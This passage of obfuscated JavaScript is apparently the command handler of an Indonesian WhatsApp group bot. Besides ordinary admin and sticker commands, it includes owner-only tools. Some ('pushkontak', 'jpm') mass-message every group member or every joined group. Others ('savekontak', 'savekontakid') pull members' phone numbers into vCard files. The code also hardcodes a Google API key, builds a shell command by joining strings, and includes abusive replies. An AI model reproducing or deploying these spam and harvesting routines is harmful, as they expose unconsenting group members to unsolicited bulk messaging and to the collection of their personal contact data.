            return _0x4611fa.reply("Fitur Khusus owner!");
          }
          if (!_0x3e94bb) {
            return _0x4611fa.reply("Gunakan dengan cara " + (_0x137417 + _0x53d4d1) + " *teks_left*\n\n_Contoh_\n\n" + (_0x137417 + _0x53d4d1) + " Halo @user, Selamat tinggal dari @group");
          }
          if (isSetLeft(_0x4611fa.chat, _0x33cb69)) {
            changeSetLeft(q, _0x4611fa.chat, _0x33cb69);
            _0x1d3510("Sukses change set left teks!");
          } else {
            addSetLeft(q, _0x4611fa.chat, _0x33cb69);
            _0x1d3510("Sukses change set left teks!");
          }
        }
        break;
      case "delsetleft":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x1220c9 && !_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus owner!");
          }
          if (!isSetLeft(_0x4611fa.chat, _0x33cb69)) {
            return _0x4611fa.reply("Belum ada set left di sini..");
          }
          removeSetLeft(_0x4611fa.chat, _0x33cb69);
          _0x1d3510("Sukses delete set left");
        }
        break;
      case "setdesc":
      case "setdesk":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x3c8260) {
            return _0x4611fa.reply("Jadikan bot sebagai admin");
          }
          if (!_0x3e94bb) {
            return _0x4611fa.reply("Example " + (_0x137417 + _0x53d4d1) + " WhatsApp Bot");
          }
          await _0x221ba4.groupUpdateDescription(_0x4611fa.chat, _0x3e94bb).then(_0x54f3cd => _0x4611fa.reply("Done")).catch(_0x19cf5a => _0x4611fa.reply("Terjadi kesalahan"));
        }
        break;
      case "promote":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x3c8260) {
            return _0x4611fa.reply("Jadikan bot sebagai admin");
          }
          let _0x4b4678 = _0x4611fa.mentionedJid[0] ? _0x4611fa.mentionedJid[0] : _0x4611fa.quoted ? _0x4611fa.quoted.sender : _0x3e94bb.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x221ba4.groupParticipantsUpdate(_0x4611fa.chat, [_0x4b4678], "promote").then(_0x22fb05 => _0x4611fa.reply("Sukses promote member✅")).catch(_0x39d984 => _0x4611fa.reply("❌ Terjadi kesalahan"));
        }
        break;
      case "demote":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x3c8260) {
            return _0x4611fa.reply("Jadikan bot sebagai admin");
          }
          let _0x84d0e9 = _0x4611fa.mentionedJid[0] ? _0x4611fa.mentionedJid[0] : _0x4611fa.quoted ? _0x4611fa.quoted.sender : _0x3e94bb.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x221ba4.groupParticipantsUpdate(_0x4611fa.chat, [_0x84d0e9], "demote").then(_0x20d229 => _0x4611fa.reply("Sukses demote admin✅")).catch(_0x149ec8 => _0x4611fa.reply("❌ Terjadi kesalahan"));
        }
        break;
      case "setlinkgc":
      case "revoke":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x3c8260) {
            return _0x4611fa.reply("Jadikan bot sebagai admin");
          }
          await _0x221ba4.groupRevokeInvite(_0x4611fa.chat).then(_0x119f6d => {
            _0x1d3510("Sukses menyetel tautan undangan grup ini");
          }).catch(() => _0x1d3510("Terjadi kesalahan"));
        }
        break;
      case "linkgrup":
      case "linkgroup":
      case "linkgc":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x3c8260) {
            return _0x4611fa.reply("Jadikan bot sebagai admin");
          }
          let _0x2fce40 = await _0x221ba4.groupInviteCode(_0x4611fa.chat);
          _0x4611fa.reply("https://chat.whatsapp.com/" + _0x2fce40 + "\n\nLink Group : " + _0x381873.subject);
        }
        break;
      case "setppgroup":
      case "setppgrup":
      case "setppgc":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x3c8260) {
            return _0x4611fa.reply("Jadikan bot sebagai admin");
          }
          if (!_0x3af358) {
            return _0x4611fa.reply("Kirim/Reply Image Dengan Caption " + (_0x137417 + _0x53d4d1));
          }
          if (!/image/.test(_0x27f568)) {
            return _0x4611fa.reply("Kirim/Reply Image Dengan Caption " + (_0x137417 + _0x53d4d1));
          }
          if (/webp/.test(_0x27f568)) {
            return _0x4611fa.reply("Kirim/Reply Image Dengan Caption " + (_0x137417 + _0x53d4d1));
          }
          let _0x355513 = await _0x221ba4.downloadAndSaveMediaMessage(_0x3af358);
          const _0x1617d6 = {
            url: _0x355513
          };
          await _0x221ba4.updateProfilePicture(_0x4611fa.chat, _0x1617d6).catch(_0x4b2053 => fs3.unlinkSync(_0x355513));
          _0x4611fa.reply("Berhasil mengganti pp group");
        }
        break;
      case "setname":
      case "setnamegc":
      case "setsubject":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x3c8260) {
            return _0x4611fa.reply("Jadikan bot sebagai admin");
          }
          if (!_0x3e94bb) {
            return _0x1d3510("Contoh " + (_0x137417 + _0x53d4d1) + " bot WhatsApp");
          }
          await _0x221ba4.groupUpdateSubject(_0x4611fa.chat, _0x3e94bb).then(_0x58c8c4 => _0x1d3510("Done")).catch(_0x17e183 => _0x1d3510("Terjadi kesalahan"));
        }
        break;
      case "kick":
      case "jumpshot":
      case "sulap":
      case "hus":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x3c8260) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          let _0x9cae11 = _0x4611fa.mentionedJid[0] ? _0x4611fa.mentionedJid[0] : _0x4611fa.quoted ? _0x4611fa.quoted.sender : _0x3e94bb.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x221ba4.groupParticipantsUpdate(_0x4611fa.chat, [_0x9cae11], "remove").then(_0x19e4fd => _0x4611fa.reply("Sukses kick target✅")).catch(_0x5437b3 => _0x4611fa.reply("❌ Terjadi kesalahan"));
        }
        break;
      case "h":
      case "hidetag":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x1d3510("Khusus grup");
          }
          if (!_0x13697b && !_0x1220c9) {
            return _0x1d3510("Fitur khusus admin");
          }
          let _0x45dae8 = _0x4611fa.quoted ? _0x3af358.text : _0x3e94bb ? _0x3e94bb : "";
          _0x221ba4.sendMessage(_0x4611fa.chat, {
            text: _0x45dae8,
            mentions: _0x264c7c.map(_0x1c7e83 => _0x1c7e83.id)
          }, {});
        }
        break;
      case "close":
      case "tutup":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x3c8260) {
            return _0x4611fa.reply("Bot bukan admin");
          }
          _0x221ba4.groupSettingUpdate(_0x4611fa.chat, "announcement");
          const _0x13a8c0 = await getTextSetClose(_0x4611fa.chat, _0x535722);
          _0x1d3510(_0x13a8c0 || "Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini");
        }
        break;
      case "antilink2":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x3c8260) {
            return _0x4611fa.reply("Bot harus menjadi admin");
          }
          if (_0x18d0e5[0] === "on") {
            if (_0x2ede3c) {
              return _0x4611fa.reply("Udah aktif");
            }
            _0x5912c7.push(_0x4611fa.chat);
            fs3.writeFileSync("./database/antilink2.json", JSON.stringify(_0x5912c7, null, 2));
            _0x1d3510("Successfully Activate antilink2 In This Group");
          } else if (_0x18d0e5[0] === "off") {
            if (!_0x2ede3c) {
              return _0x4611fa.reply("Udah nonaktif");
            }
            let _0x57d7c9 = _0x5912c7.indexOf(_0x4611fa.chat);
            _0x5912c7.splice(_0x57d7c9, 1);
            fs3.writeFileSync("./database/antilink2.json", JSON.stringify(_0x5912c7, null, 2));
            _0x1d3510("Successfully Disabling antilink2 In This Group");
          } else {
            _0x1d3510("Kirim perintah " + (_0x137417 + _0x53d4d1) + " on/off\n\nContoh: " + (_0x137417 + _0x53d4d1) + " on");
          }
        }
        break;
      case "autojpm":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (_0x18d0e5[0] === "on") {
            if (_0x5325f0) {
              return _0x4611fa.reply("Udah aktif");
            }
            _0x569d96.push(_0x4611fa.chat);
            fs3.writeFileSync("./database/autojpm.json", JSON.stringify(_0x569d96, null, 2));
            _0x1d3510("Successfully Activate autojpm In This Group");
          } else if (_0x18d0e5[0] === "off") {
            if (!_0x5325f0) {
              return _0x4611fa.reply("Udah nonaktif");
            }
            let _0x3b1653 = _0x569d96.indexOf(_0x4611fa.chat);
            _0x5912c7.splice(_0x3b1653, 1);
            fs3.writeFileSync("./database/autojpm.json", JSON.stringify(_0x569d96, null, 2));
            _0x1d3510("Successfully Disabling autojpm In This Group");
          } else {
            _0x1d3510("Kirim perintah " + (_0x137417 + _0x53d4d1) + " on/off\n\nContoh: " + (_0x137417 + _0x53d4d1) + " on");
          }
        }
        break;
      case "open":
      case "buka":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x3c8260) {
            return _0x4611fa.reply("Bot bukan admin");
          }
          _0x221ba4.groupSettingUpdate(_0x4611fa.chat, "not_announcement");
          const _0x3a7d70 = await getTextSetOpen(_0x4611fa.chat, _0x465543);
          _0x1d3510(_0x3a7d70 || "Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini");
        }
        break;
      case "jeda":
        {
          if (!_0x556b9c) {
            return _0x4611fa.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x4611fa.isGroup) {
            return _0x4611fa.reply("Fitur Khusus Group!");
          }
          if (!_0x13697b) {
            return _0x4611fa.reply("Fitur Khusus admin!");
          }
          if (!_0x3c8260) {
            return _0x4611fa.reply("Jadikan bot sebagai admin terlebih dahulu");
          }
          if (!_0x3e94bb) {
            return _0x4611fa.reply("kirim " + _0x53d4d1 + " waktu\nContoh: " + _0x53d4d1 + " 30m\n\nlist waktu:\ns = detik\nm = menit\nh = jam\nd = hari");
          }
          _0x550325[_0x4611fa.chat] = {
            id: _0x4611fa.chat,
            time: Date.now() + toMs(_0x3e94bb)
          };
          fs3.writeFileSync("./database/opengc.json", JSON.stringify(_0x550325));
          _0x221ba4.groupSettingUpdate(_0x4611fa.chat, "announcement").then(_0x5e547d => _0x1d3510("Sukses, group akan dibuka " + _0x3e94bb + " lagi")).catch(_0xdff159 => _0x1d3510("Error"));
        }
        break;
      case "cekidgc":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.premium);
          }
          await _0x1d3510(mess.wait);
          let _0x291745 = await _0x221ba4.groupFetchAllParticipating();
          let _0x507c62 = Object.entries(_0x291745).slice(0).map(_0x5e1b98 => _0x5e1b98[1]);
          let _0x4333d2 = _0x507c62.map(_0x345fc9 => _0x345fc9.id);
          let _0x409905 = "⬣ *LIST GROUP BY Dáreen Albérich𓆰⸸𓆪*\n\nTotal Group : " + _0x4333d2.length + " Group\n\n";
          for (let _0x21b0c3 of _0x4333d2) {
            let _0x21bb21 = await _0x221ba4.groupMetadata(_0x21b0c3);
            _0x409905 += "◉ Nama : " + _0x21bb21.subject + "\n◉ ID : " + _0x21bb21.id + "\n◉ Member : " + _0x21bb21.participants.length + "\n\n────────────────────────\n\n";
          }
          _0x1d3510(_0x409905 + ("Untuk Penggunaan Silahkan Ketik Command " + _0x137417 + "pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas"));
        }
        break;
      case "pushkontakid":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.owner);
          }
          let _0x42e462 = _0x3e94bb.split("|")[0];
          let _0x5e9e2c = _0x3e94bb.split("|")[1];
          if (!_0x42e462 && !_0x5e9e2c) {
            return _0x1d3510("Example: " + (_0x137417 + _0x53d4d1) + " idgc|pesan");
          }
          let _0xcd5c43 = await _0x221ba4.groupMetadata(_0x42e462).catch(_0x214bc7 => _0x1d3510(_0x214bc7));
          let _0x4efc81 = await _0xcd5c43.participants.filter(_0x1d3dbc => _0x1d3dbc.id.endsWith(".net")).map(_0x1e0ccb => _0x1e0ccb.id);
          let _0x25be78 = _0x4efc81.length;
          let _0x17d1dd = 0;
          _0x1d3510("*BOT BY Dáreen Albérich𓆰⸸𓆪*\n\n*Member: " + _0x4efc81.length + "*\n*Waktu: " + _0x4efc81.length * 7 + " detik*");
          for (let _0x59c5dd = 0; _0x59c5dd < _0x4efc81.length; _0x59c5dd++) {
            setTimeout(function () {
              const _0x3edd5d = {
                text: _0x5e9e2c
              };
              _0x221ba4.sendMessage(_0x4efc81[_0x59c5dd], _0x3edd5d);
              _0x25be78--;
              _0x17d1dd++;
              if (_0x25be78 === 0) {
                _0x1d3510("Pushkontak completed Mau save kontak ketik .savekontakid");
              }
            }, _0x59c5dd * 7000);
          }
        }
        break;
      case "pushkontakgc":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.owner);
          }
          if (!_0x4611fa.isGroup) {
            return _0x1d3510("Khusus Di Grup Bang");
          }
          if (!_0x3e94bb) {
            return _0x1d3510("Teks Nya Kak?");
          }
          let _0x1fef5b = await _0x264c7c.filter(_0x2cea6e => _0x2cea6e.id.endsWith(".net")).map(_0x3388fa => _0x3388fa.id);
          let _0x27680f = "" + q;
          _0x1d3510("*BOT BY Dáreen Albérich𓆰⸸𓆪*\n\n*SEDANG MELAKSANAKAN PUSH*");
          for (let _0x11a2a2 of _0x1fef5b) {
            await sleep(7000);
            const _0x5098c3 = {
              quoted: _0x568be6
            };
            _0x221ba4.sendMessage(_0x11a2a2, {
              text: "" + _0x27680f
            }, _0x5098c3);
          }
          _0x1d3510("Pushkontak completed Mau save kontak ketik .savekontak");
        }
        break;
      case "savekontak":
      case "svkontak":
        if (!_0x1220c9) {
          return _0x1d3510("Khusus Dáreen Albérich𓆰⸸𓆪 Store");
        }
        if (!_0x2ec274) {
          return _0x4611fa.reply("Khusus Group Kontol");
        }
        let _0x36ef5b = await _0x221ba4.groupMetadata(_0x4611fa.chat);
        let _0x357e92 = _0x264c7c.map(_0x5a0918 => _0x5a0918.id);
        vcard = "";
        noPort = 0;
        for (let _0x49b5b of _0x36ef5b.participants) {
          vcard += "BEGIN:VCARD\nVERSION:3.0\nFN:[" + noPort++ + "] " + global.save + "-" + _0x49b5b.id.split("@")[0] + "\nTEL;type=CELL;type=VOICE;waid=" + _0x49b5b.id.split("@")[0] + ":+" + _0x49b5b.id.split("@")[0] + "\nEND:VCARD\n";
        }
        let _0x9d54af = "./contacts.vcf";
        _0x1d3510("*Mengimpor " + _0x36ef5b.participants.length + " kontak..*");
        fs3.writeFileSync(_0x9d54af, vcard.trim());
        await sleep(2000);
        _0x221ba4.sendMessage(_0x4611fa.chat, {
          document: fs3.readFileSync(_0x9d54af),
          mimetype: "text/vcard",
          fileName: "Contact.vcf",
          caption: "GROUP: *" + _0x36ef5b.subject + "*\nMEMBER: *" + _0x36ef5b.participants.length + "*"
        }, {
          ephemeralExpiration: 86400,
          quoted: _0x4611fa
        });
        fs3.unlinkSync(_0x9d54af);
        break;
      case "idgc":
      case "getkontak":
        if (!_0x1220c9) {
          return _0x1d3510("Khusus BANG Dáreen Albérich𓆰⸸𓆪,");
        }
        if (!_0x2ec274) {
          return _0x4611fa.reply("Khusus Group Kontol");
        }
        huhuhs = await _0x221ba4.sendMessage(_0x4611fa.chat, {
          text: "*ID : " + _0x381873.id + "\n\nJangan Lupa Di Salin Idnya Yah BANG Dáreen Albérich𓆰⸸𓆪,*"
        }, {
          quoted: _0x4611fa,
          ephemeralExpiration: 86400
        });
        await sleep(1000);
        _0x1d3510;
        break;
      case "jpm":
        {
          if (!_0x1220c9) {
            return _0x1d3510("Khusus Dáreen Albérich𓆰⸸𓆪 Gamteng");
          }
          if (!_0x3e94bb) {
            throw "Text mana?\n\nExample : " + (_0x137417 + _0x53d4d1) + " Dáreen Albérich𓆰⸸𓆪 ganteng";
          }
          let _0xf34358 = await _0x221ba4.groupFetchAllParticipating();
          let _0x1a39aa = Object.entries(_0xf34358).slice(0).map(_0x468cd7 => _0x468cd7[1]);
          let _0x3953ed = _0x1a39aa.map(_0x674a47 => _0x674a47.id);
          _0x4611fa.reply("Mengirim Jpm Ke " + _0x3953ed.length + " Group Chat, Waktu Selesai " + _0x3953ed.length * 1.5 + " detik");
          for (let _0x3de92d of _0x3953ed) {
            await sleep(500);
            const _0x1154f8 = {
              quoted: _0x4611fa
            };
            _0x221ba4.sendMessage(_0x3de92d, {
              text: "" + _0x3e94bb
            }, _0x1154f8);
          }
          _0x4611fa.reply("Sukses Mengirim Broadcast Ke " + _0x3953ed.length + " Group");
        }
        break;
      case "savekontakid":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply(mess.only.owner);
          }
          if (!_0x3e94bb) {
            return _0x4611fa.reply("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup");
          }
          var _0x1b4279 = _0x3e94bb;
          var _0x4a0c30;
          try {
            _0x4a0c30 = await _0x221ba4.groupMetadata("" + _0x1b4279);
          } catch (_0x3e6a28) {
            return _0x4611fa.reply("*ID Grup* tidak valid!");
          }
          const _0x357876 = await _0x4a0c30.participants;
          const _0x4aa38f = await _0x357876.filter(_0x428be5 => _0x428be5.id.endsWith(".net")).map(_0x349f28 => _0x349f28.id);
          for (let _0x2d0d6b of _0x4aa38f) {
            if (_0x2d0d6b !== _0x4611fa.sender) {
              _0x38d731.push(_0x2d0d6b);
              fs3.writeFileSync("./database/dareen/contacts.json", JSON.stringify(_0x38d731));
            }
          }
          try {
            const _0x1b8b6d = [...new Set(_0x38d731)];
            const _0x1d5c94 = _0x1b8b6d.map((_0x448457, _0x535174) => {
              const _0x1d2a76 = ["BEGIN:VCARD", "VERSION:3.0", "FN:" + global.save + " " + _0x448457.split("@")[0], "TEL;type=CELL;type=VOICE;waid=" + _0x448457.split("@")[0] + ":+" + _0x448457.split("@")[0], "END:VCARD", ""].join("\n");
              return _0x1d2a76;
            }).join("");
            fs3.writeFileSync("./database/dareen/contacts.vcf", _0x1d5c94, "utf8");
          } catch (_0x2c4015) {
            _0x4611fa.reply(_0x2c4015.toString());
          } finally {
            if (_0x4611fa.chat !== _0x4611fa.sender) {
              await _0x4611fa.reply("File Kontak Berhasil Dikirim ke Private Chat");
            }
            await _0x221ba4.sendMessage(_0x4611fa.sender, {
              document: fs3.readFileSync("./database/dareen/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: "File Contact Berhasil Di Buat✅",
              mimetype: "text/vcard"
            }, {
              quoted: _0x4611fa
            });
            _0x38d731.splice(0, _0x38d731.length);
            await fs3.writeFileSync("./database/dareen/contacts.json", JSON.stringify(_0x38d731));
            await fs3.writeFileSync("./database/dareen/contacts.vcf", "");
          }
        }
        break;
      case "toimage":
      case "toimg":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply("*Lu Di Ban Owner Gak Usah Sok asik Tolol*");
          }
          await _0x1d3510(mess.wait);
          if (!_0x3af358) {
            throw "Reply Image";
          }
          if (!/webp/.test(_0x27f568)) {
            throw "Balas sticker dengan caption *" + (_0x137417 + _0x53d4d1) + "*";
          }
          let _0x85fcc3 = await _0x221ba4.downloadAndSaveMediaMessage(_0x3af358);
          let _0x23de53 = await getRandom(".png");
          exec("ffmpeg -i " + _0x85fcc3 + " " + _0x23de53, _0x4c1b13 => {
            fs3.unlinkSync(_0x85fcc3);
            if (_0x4c1b13) {
              throw _0x4c1b13;
            }
            let _0x12fe71 = fs3.readFileSync(_0x23de53);
            const _0x4127c0 = {
              image: _0x12fe71
            };
            const _0x1a2e58 = {
              quoted: _0x4611fa
            };
            _0x221ba4.sendMessage(_0x1dd769, _0x4127c0, _0x1a2e58);
            fs3.unlinkSync(_0x23de53);
          });
        }
        break;
      case "sticker":
      case "s":
      case "stickergif":
      case "sgif":
        {
          if (!_0x3af358) {
            throw "Balas Video/Image Dengan Caption " + (_0x137417 + _0x53d4d1);
          }
          if (/image/.test(_0x27f568)) {
            let _0x57e23a = await _0x3af358.download();
            const _0x252b96 = {
              packname: global.packname,
              author: global.author
            };
            let _0x1479a5 = await _0x221ba4.sendImageAsSticker(_0x1dd769, _0x57e23a, _0x4611fa, _0x252b96);
            await fs3.unlinkSync(_0x1479a5);
          } else if (/video/.test(_0x27f568)) {
            if ((_0x3af358.msg || _0x3af358).seconds > 11) {
              return _0x4611fa.reply("Maksimal 10 detik!");
            }
            let _0x56a4f9 = await _0x3af358.download();
            const _0x58d60e = {
              packname: global.packname,
              author: global.author
            };
            let _0x2fa6db = await _0x221ba4.sendVideoAsSticker(_0x1dd769, _0x56a4f9, _0x4611fa, _0x58d60e);
            await fs3.unlinkSync(_0x2fa6db);
          } else {
            throw "Kirim Gambar/Video Dengan Caption " + (_0x137417 + _0x53d4d1) + "\nDurasi Video 1-9 Detik";
          }
        }
        break;
      case "telegraph":
      case "tourl":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply("*Lu Di Ban Owner Gak Usah Sok asik Tolol*");
          }
          await _0x1d3510(mess.wait);
          if (!/video/.test(_0x27f568) && !/image/.test(_0x27f568)) {
            throw "*Send/Reply the Video/Image With Caption* " + (_0x137417 + _0x53d4d1);
          }
          if (!_0x3af358) {
            throw "*Send/Reply the Video/Image Caption* " + (_0x137417 + _0x53d4d1);
          }
          let {
            UploadFileUgu: _0x3a511a,
            webp2mp4File: _0x815b6d,
            TelegraPh: _0xd81467
          } = require("./database/uploader");
          let _0x1995e6 = await _0x221ba4.downloadAndSaveMediaMessage(_0x3af358);
          if (/image/.test(_0x27f568)) {
            let _0x3301e4 = await _0xd81467(_0x1995e6);
            _0x4611fa.reply(util2.format(_0x3301e4));
          } else if (!/image/.test(_0x27f568)) {
            let _0xbd9145 = await _0x3a511a(_0x1995e6);
            _0x4611fa.reply(util2.format(_0xbd9145));
          }
          await fs3.unlinkSync(_0x1995e6);
        }
        break;
      case "qc":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply("Khusus BANG Dáreen Albérich𓆰⸸𓆪,");
          }
          let _0x4eac80 = _0x4611fa.quoted && _0x4611fa.quoted.q ? _0x4611fa.quoted.text : q ? q : "";
          if (!_0x4eac80) {
            return _0x4611fa.reply("Cara Penggunaan " + _0x137417 + "qc teks");
          }
          const _0x279510 = "" + _0x4eac80;
          const _0x4a7f47 = await _0x221ba4.getName(_0x4611fa.quoted ? _0x4611fa.quoted.sender : _0x4611fa.sender);
          const _0x1d6bba = await _0x221ba4.profilePictureUrl(_0x4611fa.quoted ? _0x4611fa.quoted.sender : _0x4611fa.sender, "image").catch(() => "https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png");
          const _0x664d69 = {
            url: _0x1d6bba
          };
          const _0x7ec9da = {
            id: 1,
            name: _0x4a7f47,
            photo: _0x664d69
          };
          const _0x30e399 = {
            entities: [],
            avatar: true,
            from: _0x7ec9da,
            text: _0x279510,
            replyMessage: {}
          };
          const _0xc1a97c = {
            type: "quote",
            format: "png",
            backgroundColor: "#FFFFFF",
            width: 700,
            height: 580,
            scale: 2,
            messages: [_0x30e399]
          };
          const _0x3557fd = _0xc1a97c;
          axios2.post("https://bot.lyo.su/quote/generate", _0x3557fd, {
            headers: {
              "Content-Type": "application/json"
            }
          }).then(async _0x2b5ab4 => {
            const _0x32e579 = Buffer.from(_0x2b5ab4.data.result.image, "base64");
            const _0x153fc6 = {
              packname: global.packname,
              author: global.author,
              categories: ["🤩", "🎉"],
              id: "12345",
              quality: 100,
              background: "transparent"
            };
            let _0x353e1d = await _0x221ba4.sendImageAsSticker(_0x4611fa.chat, _0x32e579, _0x4611fa, _0x153fc6);
            await fs3.unlinkSync(_0x353e1d);
          });
        }
        break;
      case "remini":
      case "hd":
        {
          if (!_0x1220c9) {
            return _0x1d3510("Ngapain ? Fitur Ini Buat BANG Dáreen Albérich𓆰⸸𓆪,");
          }
          if (!_0x3af358) {
            return _0x1d3510("Fotonya Mana?");
          }
          if (!/image/.test(_0x27f568)) {
            return _0x1d3510("Send/Reply Foto Dengan Caption " + (_0x137417 + _0x53d4d1));
          }
          _0x1d3510(mess.wait);
          let _0x8e573c = await _0x3af358.download();
          let _0x42674c = await remini(_0x8e573c, "enhance");
          const _0x165e1a = {
            image: _0x42674c,
            caption: "🍁 Ini Hasilnya Kak..."
          };
          _0x221ba4.sendMessage(_0x4611fa.chat, _0x165e1a, {
            quoted: _0x4611fa
          });
          await sleep(5000);
        }
        break;
      case "wmvideo":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply(mess.only.owner);
          }
          let _0x45e050 = "" + _0x3e94bb;
          {
            if ((_0x3af358.msg || _0x3af358).seconds > 11) {
              return _0x4611fa.reply("Maksimal 10 detik!");
            }
            if (/video/.test(_0x27f568)) {
              let _0xa98309 = await _0x3af358.download();
              let _0x740993 = await _0x221ba4.sendVideoAsSticker(_0x1dd769, _0xa98309, _0x4611fa, {
                packname: "" + _0x45e050,
                author: "" + botname
              });
              await fs3.unlinkSync(_0x740993);
            } else {
              throw "Kirim Gambar/Video Dengan Caption " + (_0x137417 + _0x53d4d1) + "\nDurasi Video 1-9 Detik";
            }
          }
        }
        break;
      case "wm":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply(mess.only.owner);
          }
          let _0x1243ce = "" + _0x3e94bb;
          {
            if (!_0x3af358) {
              throw "Balas Video/Image Dengan Caption " + (_0x137417 + _0x53d4d1);
            }
            if (/image/.test(_0x27f568)) {
              let _0xf7fb2b = await _0x3af358.download();
              let _0x581797 = await _0x221ba4.sendImageAsSticker(_0x1dd769, _0xf7fb2b, _0x4611fa, {
                packname: "" + _0x1243ce,
                author: "" + botname
              });
              await fs3.unlinkSync(_0x581797);
            }
          }
        }
        break;
      case "emojimix":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply(mess.only.owner);
          }
          let [_0x425bf4, _0x2d22a7] = _0x3e94bb.split`+`;
          if (!_0x425bf4) {
            throw "Example : " + (_0x137417 + _0x53d4d1) + " 😅+🤔";
          }
          if (!_0x2d22a7) {
            throw "Example : " + (_0x137417 + _0x53d4d1) + " 😅+🤔";
          }
          let _0x2f5f30 = await fetchJson("https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=" + encodeURIComponent(_0x425bf4) + "_" + encodeURIComponent(_0x2d22a7));
          for (let _0x52dc00 of _0x2f5f30.results) {
            let _0x20a7ae = await _0x221ba4.sendImageAsSticker(_0x1dd769, _0x52dc00.url, _0x4611fa, {
              packname: global.packname,
              author: global.author,
